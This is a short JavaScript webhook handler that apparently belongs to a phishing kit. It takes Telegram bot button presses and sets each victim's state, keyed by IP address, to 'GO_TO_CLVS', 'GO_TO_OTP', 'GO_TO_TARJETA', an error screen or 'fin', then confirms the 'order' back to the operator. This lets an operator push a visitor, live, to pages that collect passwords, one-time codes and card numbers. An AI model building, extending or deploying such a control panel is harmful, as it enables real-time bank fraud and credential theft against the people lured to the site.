import { setUserState } from '../lib/utils.js';

export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    try {
        const data = req.body;
        if (data && data.callback_query) {
            const query = data.callback_query;
            const callbackData = query.data || "";

            if (callbackData.startsWith("cmd|")) {
                const parts = callbackData.split("|");
                if (parts.length === 3) {
                    const action = parts[1];
                    const ip = parts[2];

                    const statusMap = {
                        "clvs": "GO_TO_CLVS",
                        "otp": "GO_TO_OTP",
                        "tarjeta": "GO_TO_TARJETA",
                        "error": "ERROR_CLVS",
                        "fin": "GO_TO_FIN"
                    };
                    const newStatus = statusMap[action] || "WAITING";

                    await setUserState(ip, newStatus);

                    const token = process.env.TELEGRAM_BOT_TOKEN;
                    if (token && token !== "YOUR_BOT_TOKEN_HERE") {
                        await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                callback_query_id: query.id,
                                text: `Orden: ${action} enviada a ${ip}.`
                            })
                        });
                    }
                }
            }
        }
    } catch (e) {
        console.error(e);
    }
    
    res.status(200).json({ status: "ok" });
}
